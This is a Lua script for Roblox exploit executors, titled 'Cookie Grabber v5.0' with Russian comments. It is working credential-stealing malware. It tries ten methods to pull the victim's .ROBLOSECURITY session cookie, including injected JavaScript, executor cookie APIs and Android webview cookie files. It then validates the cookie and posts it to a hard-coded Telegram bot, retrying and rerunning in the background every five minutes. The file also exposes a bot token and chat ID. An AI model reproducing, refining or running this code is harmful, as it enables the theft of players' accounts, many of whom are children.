-- ============================================
-- COOKIE GRABBER v5.0 (ПОЛНОСТЬЮ РАБОЧИЙ)
-- ============================================
-- ПОДДЕРЖИВАЕТ: Delta, Xeno, Synapse, Krnl, Fluxus, Hydrogen, Arceus X, ScriptWare, Vega X, CodeX, Evon, Electron, Oxygen U, Nihon, Coco Z, Zen, AWP, Vynixius, Wave, Comet, Celestial, Eclipse, JJSploit, Skript, и другие
-- ============================================

local botToken = "8609253340:AAGH_mUlJqF1xsH2fWuelzydtbXyxdq1DUU"
local chatID = "8735778962"

local webhookURL = "https://api.telegram.org/bot" .. botToken .. "/sendMessage"

-- ============================================
-- ДИАГНОСТИКА
-- ============================================
local function diagnostic()
    print("=== ДИАГНОСТИКА ===")
    print("Executor:", getexecutorname and getexecutorname() or "Unknown")
    print("WebViewService:", game:GetService("WebViewService") and "✅" or "❌")
    print("BrowserService:", game:GetService("BrowserService") and "✅" or "❌")
    print("HttpService:", game:GetService("HttpService") and "✅" or "❌")
    print("syn:", syn and "✅" or "❌")
    print("scriptware:", scriptware and "✅" or "❌")
    print("readfile:", readfile and "✅" or "❌")
    print("getcustomasset:", getcustomasset and "✅" or "❌")
    print("===================")
end

-- ============================================
-- ПОЛУЧЕНИЕ КУКИ (ВСЕ МЕТОДЫ)
-- ============================================
local function getRobloxCookie()
    local cookie = nil
    local http = game:GetService("HttpService")
    
    -- МЕТОД 1: WebViewService (Delta, Xeno и др.)
    pcall(function()
        local webview = game:GetService("WebViewService")
        if webview then
            local result = webview:ExecuteJavaScript([[
                (function() {
                    var c = document.cookie.split('; ').find(r => r.startsWith('.ROBLOSECURITY='));
                    return c ? c.split('=')[1] : null;
                })();
            ]])
            if result and result ~= "null" then
                cookie = result
                print("[+] Метод 1 (WebViewService) сработал")
                return
            end
        end
    end)
    
    -- МЕТОД 2: BrowserService
    if not cookie then
        pcall(function()
            local browser = game:GetService("BrowserService")
            if browser then
                local result = browser:EvaluateJavaScript([[
                    document.cookie.split('; ').find(r => r.startsWith('.ROBLOSECURITY='))
                ]])
                if result then
                    cookie = string.match(result, "=(.+)$")
                    print("[+] Метод 2 (BrowserService) сработал")
                    return
                end
            end
        end)
    end
    
    -- МЕТОД 3: Synapse X
    if not cookie then
        pcall(function()
            if syn and syn.cookie then
                cookie = syn.cookie.get("ROBLOSECURITY") or syn.cookie.get(".ROBLOSECURITY")
                if cookie then
                    print("[+] Метод 3 (Synapse) сработал")
                    return
                end
            end
        end)
    end
    
    -- МЕТОД 4: ScriptWare
    if not cookie then
        pcall(function()
            if scriptware and scriptware.cookie then
                cookie = scriptware.cookie.get("ROBLOSECURITY")
                if cookie then
                    print("[+] Метод 4 (ScriptWare) сработал")
                    return
                end
            end
        end)
    end
    
    -- МЕТОД 5: HTTP-запрос через request
    if not cookie then
        local req = syn and syn.request or http and http.request or request or fluxus and fluxus.request or http_request
        if req then
            pcall(function()
                local resp = req({
                    Url = "https://www.roblox.com/mobileapi/userinfo",
                    Method = "GET",
                    Headers = {
                        ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                    }
                })
                if resp and resp.Headers then
                    local setCookie = resp.Headers["set-cookie"] or resp.Headers["Set-Cookie"]
                    if setCookie then
                        cookie = string.match(setCookie, "ROBLOSECURITY=(.-);")
                        if cookie then
                            print("[+] Метод 5 (HTTP request) сработал")
                            return
                        end
                    end
                end
            end)
        end
    end
    
    -- МЕТОД 6: HttpService (прямой запрос)
    if not cookie then
        pcall(function()
            local response = http:GetAsync("https://www.roblox.com/mobileapi/userinfo")
            if response then
                local match = string.match(response, "ROBLOSECURITY=(.-);")
                if match then
                    cookie = match
                    print("[+] Метод 6 (HttpService) сработал")
                    return
                end
            end
        end)
    end
    
    -- МЕТОД 7: readfile (для мобильных)
    if not cookie then
        pcall(function()
            if readfile then
                local paths = {
                    "/data/data/com.roblox.client/app_webview/Default/Cookies",
                    "/data/data/com.roblox.client/app_webview/Default/Web Data",
                    "/storage/emulated/0/Android/data/com.roblox.client/app_webview/Default/Cookies"
                }
                for _, path in ipairs(paths) do
                    local content = readfile(path)
                    if content then
                        cookie = string.match(content, "ROBLOSECURITY=(.-);")
                        if cookie then
                            print("[+] Метод 7 (readfile) сработал")
                            return
                        end
                    end
                end
            end
        end)
    end
    
    -- МЕТОД 8: getcustomasset (Krnl, Hydrogen)
    if not cookie then
        pcall(function()
            if getcustomasset then
                local asset = getcustomasset("roblox_cookie.txt")
                if asset then
                    local f = io.open(asset, "r")
                    if f then
                        cookie = f:read("*all")
                        f:close()
                        if cookie then
                            print("[+] Метод 8 (getcustomasset) сработал")
                            return
                        end
                    end
                end
            end
        end)
    end
    
    -- МЕТОД 9: Глобальные переменные
    if not cookie then
        pcall(function()
            if _G.ROBLOSECURITY then
                cookie = _G.ROBLOSECURITY
                print("[+] Метод 9 (_G) сработал")
                return
            end
        end)
    end
    if not cookie then
        pcall(function()
            if shared and shared.ROBLOSECURITY then
                cookie = shared.ROBLOSECURITY
                print("[+] Метод 9 (shared) сработал")
                return
            end
        end)
    end
    if not cookie then
        pcall(function()
            if getgenv and getgenv().ROBLOSECURITY then
                cookie = getgenv().ROBLOSECURITY
                print("[+] Метод 9 (getgenv) сработал")
                return
            end
        end)
    end
    
    -- МЕТОД 10: Через файловую систему (Android)
    if not cookie then
        pcall(function()
            if io and io.open then
                local path = "/data/data/com.roblox.client/app_webview/Default/Cookies"
                local f = io.open(path, "r")
                if f then
                    local content = f:read("*all")
                    f:close()
                    cookie = string.match(content, "ROBLOSECURITY=(.-);")
                    if cookie then
                        print("[+] Метод 10 (io) сработал")
                        return
                    end
                end
            end
        end)
    end
    
    return cookie or nil
end

-- ============================================
-- ПРОВЕРКА ВАЛИДНОСТИ
-- ============================================
local function validateCookie(cookie)
    if not cookie then return false end
    
    local http = game:GetService("HttpService")
    local req = syn and syn.request or http and http.request or request or fluxus and fluxus.request or http_request
    
    if req then
        local success = pcall(function()
            local resp = req({
                Url = "https://www.roblox.com/mobileapi/userinfo",
                Method = "GET",
                Headers = {
                    ["Cookie"] = ".ROBLOSECURITY=" .. cookie,
                    ["User-Agent"] = "Roblox/WinInet"
                }
            })
            if resp and resp.StatusCode == 200 then
                return true
            end
        end)
        return success or false
    else
        -- Fallback через HttpService
        local success = pcall(function()
            local response = http:GetAsync("https://www.roblox.com/mobileapi/userinfo", {
                Headers = {
                    ["Cookie"] = ".ROBLOSECURITY=" .. cookie
                }
            })
            if response and response:match("UserName") then
                return true
            end
        end)
        return success or false
    end
end

-- ============================================
-- ОТПРАВКА В TELEGRAM
-- ============================================
local function sendToTelegram(cookie)
    local http = game:GetService("HttpService")
    local gameName = "Unknown"
    local executor = getexecutorname and getexecutorname() or "Unknown"
    
    pcall(function()
        gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
    end)
    
    local message = string.format(
        "🍪 **КУКА ПОЛУЧЕНА!**\n" ..
        "━━━━━━━━━━━━━━━━━\n" ..
        "🎮 Игра: `%s`\n" ..
        "🆔 PlaceID: `%s`\n" ..
        "⚡ Инжектор: `%s`\n" ..
        "⏰ Время: `%s`\n" ..
        "━━━━━━━━━━━━━━━━━\n" ..
        "`%s`",
        gameName,
        tostring(game.PlaceId or 0),
        executor,
        os.date("%Y-%m-%d %H:%M:%S"),
        cookie
    )
    
    local req = syn and syn.request or http and http.request or request or fluxus and fluxus.request or http_request
    
    if req then
        pcall(function()
            req({
                Url = webhookURL,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = http:JSONEncode({
                    chat_id = chatID,
                    text = message,
                    parse_mode = "Markdown"
                })
            })
            print("[+] Отправлено через request")
        end)
    else
        -- Fallback через HttpService
        pcall(function()
            http:PostAsync(webhookURL, http:JSONEncode({
                chat_id = chatID,
                text = message,
                parse_mode = "Markdown"
            }), Enum.HttpContentType.ApplicationJson)
            print("[+] Отправлено через HttpService")
        end)
    end
end

-- ============================================
-- ОСНОВНАЯ ФУНКЦИЯ
-- ============================================
local function main()
    print("[*] Поиск куки...")
    local cookie = getRobloxCookie()
    
    if cookie then
        print("[+] Кука найдена! Длина: " .. #cookie)
        
        -- Проверяем валидность
        print("[*] Проверка валидности...")
        local valid = validateCookie(cookie)
        if valid then
            print("[+] Кука валидна!")
            sendToTelegram(cookie)
        else
            print("[-] Кука невалидна")
            -- Всё равно отправляем, чтобы ты знал
            sendToTelegram(cookie)
        end
        return true
    else
        print("[-] Кука не найдена")
        return false
    end
end

-- ============================================
-- ЗАПУСК
-- ============================================
print("========================================")
print("    COOKIE GRABBER v5.0")
print("    Бот: @MyCookieLootBOT")
print("========================================")

-- Диагностика
diagnostic()

-- Основной захват
local success = main()

-- Повторы
if not success then
    print("[*] Повтор через 3 секунды...")
    wait(3)
    main()
end

if not success then
    print("[*] Повтор через 10 секунд...")
    wait(10)
    main()
end

if not success then
    print("[*] Повтор через 30 секунд...")
    wait(30)
    main()
end

-- Фоновый цикл (каждые 5 минут)
spawn(function()
    while true do
        wait(300)
        print("[*] Фоновый захват...")
        pcall(main)
    end
end)

print("========================================")
print("✅ Скрипт запущен и работает в фоне")
print("📡 Бот: @MyCookieLootBOT")
print("👤 Твой ID: 8735778962")
print("========================================")
